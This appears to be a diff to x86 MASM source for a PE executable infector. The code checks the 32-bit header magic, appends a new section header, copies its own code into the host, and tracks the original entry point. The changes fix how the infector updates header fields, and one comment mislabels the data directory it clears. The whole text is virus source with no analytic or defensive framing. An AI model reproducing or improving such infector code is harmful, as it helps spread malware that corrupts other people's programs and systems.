@@ -54,6 +54,11 @@ LOCAL	oldentrypoint:DWORD
 	push	esi
 	add		esi, 018h					; esi -> IMAGE_OPTIONAL_HEADER
 	
+	xor		ecx, ecx													; DataDirectory[11] = export table bound headers.
+	mov		[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx		; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualAddress = 0
+	mov		[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx	; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualSize = 0
+																		; We have to do this b/c in some cases it overlaps with our new header of section.
+
     cmp     word ptr [esi], 010bh       ; Check 32bit magic (010bh)
     jne     infect_err
 
@@ -97,7 +102,7 @@ LOCAL	oldentrypoint:DWORD
 ; --------------------------------------> Now we can move on to write our new section header.
 
 	add		esi, SIZEOF IMAGE_SECTION_HEADER	; esi -> IMAGE_SECTION_HEADER[last + 1]
-	
+
 	push	esi									;
 	mov		edi, esi							;
 	mov		esi, 0								;
@@ -160,7 +165,8 @@ LOCAL	oldentrypoint:DWORD
 	mov		ecx, ptr_sizeofcode
 	mov		edx, [ecx]
 	add		edx, end_copy - begin_copy
-	mov		[ecx], edx					; Updated SizeOfCode
+	invoke	ceil_align, edx, sectionalignment
+	mov		[ecx], eax					; Updated SizeOfCode
 
 	mov		ecx, ptr_sizeofimage
 	mov		edx, [ecx]
@@ -168,11 +174,11 @@ LOCAL	oldentrypoint:DWORD
 	invoke	ceil_align, edx, sectionalignment
 	mov		[ecx], eax					; Updated SizeOfImage
 
-	mov		ecx, ptr_sizeofheaders
-	mov		edx, [ecx]
-	add		edx, SIZEOF IMAGE_SECTION_HEADER
-	invoke	ceil_align, edx, filealignment
-	mov		[ecx], eax					; Updated SizeOfHeaders
+;	mov		ecx, ptr_sizeofheaders
+;	mov		edx, [ecx]
+;	add		edx, SIZEOF IMAGE_SECTION_HEADER
+;	invoke	ceil_align, edx, filealignment
+;	mov		[ecx], eax					; Updated SizeOfHeaders
 
 ; --------------------------------------> PE fields updated.
 ; --------------------------------------> Let's write our code where it belongs.
